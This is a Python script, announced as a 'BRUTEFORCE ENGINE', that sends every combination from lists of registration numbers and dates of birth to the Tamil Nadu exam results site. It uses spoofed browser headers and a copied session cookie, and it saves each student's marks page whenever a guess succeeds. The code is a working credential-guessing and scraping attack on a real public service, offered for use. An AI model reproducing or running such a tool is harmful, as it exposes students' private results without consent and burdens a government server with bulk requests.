import requests
from bs4 import BeautifulSoup

def resquest(reg,dob):
    url = 'https://tnresults.nic.in/wpcsxtd.asp'
    header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.7' ,
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-IN, en-GB;q=0.9,en-US;q=0.8,en;q=0.7' ,
'Cache-Control': 'max-age=0' ,
'Connection': 'keep-alive',
'Content-Length': '45',
'Content-Type':'application/x-www-form-urlencoded',
'Cookie': 'ASPSESSIONIDCQABDARQ-GAAMKBBBEHJNBIKLKOCKENHL' ,
'Host': 'tnresults.nic.in',
'Origin': 'https://tnresults.nic.in',
'Referer': 'https://tnresults.nic.in/wpcsxtd.htm',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-User': '?1',
'Upgrade-Insecure-Requests': '1User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36sec-ch-ua: "Not-A. Brand";v="99", "Chromium"; v="124" ' ,
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android" '}
    payload = {'regno':reg,'dob':dob,'B1':'Get Marks'}
    responce = requests.post(url,headers=header,data=payload)
    return responce

def datasheet(path):# this method enpack data , txt to array
    with open(path,'r') as file:
        data=[]
        lines = file.readlines()
        for line in lines:
            data.append(line.replace('\n',''))
        return data
        
Regno=datasheet('Regsheet.txt')
Dob=datasheet('dobsheet.txt')

result=[]

print(" WELCOME YO BRUTEFORCE ENGINE "+"\n") 
print("Description : this tool purpose is find everyone exam result by their regno and date using brute force attack , this attack launch many requeast to server to get result data by the wee need [regno sheet and date sheet ]")

if input("\n"+"./Start : ") == "":
    regT=0
    dobT=0
    for reg in Regno: #User
        regT = regT +1
        per = len(Dob)
        
        for dob in Dob: #date
            dobT = dobT+1
            per = per-1
            package = resquest(reg,dob)
            status=package.status_code
            content= BeautifulSoup(package.text,'html.parser').find('div',{'data-role' : 'content'}).text
            if 50 < len(content):
                print('')
                print("[  ***** ] ")
                print(f"[acssxx] : [{reg} || {dob}] -> {regT}/{dobT} @! {status} ")
                with open(f"result[{reg}].txt","w") as file:
                    file.write(f" {reg} || {dob} "+"\n")
                    file.write(str(content)+"/n"+"\n" +"/n"+"/n"+"/n")
                    file.close()
                break
            if 50 >= len(content):
                print(f"[req] :  {reg} || {dob}  {regT}/{dobT}  [{per}]@{status}  ")

print('')
print(" :: Succeful engine finish there cominations")        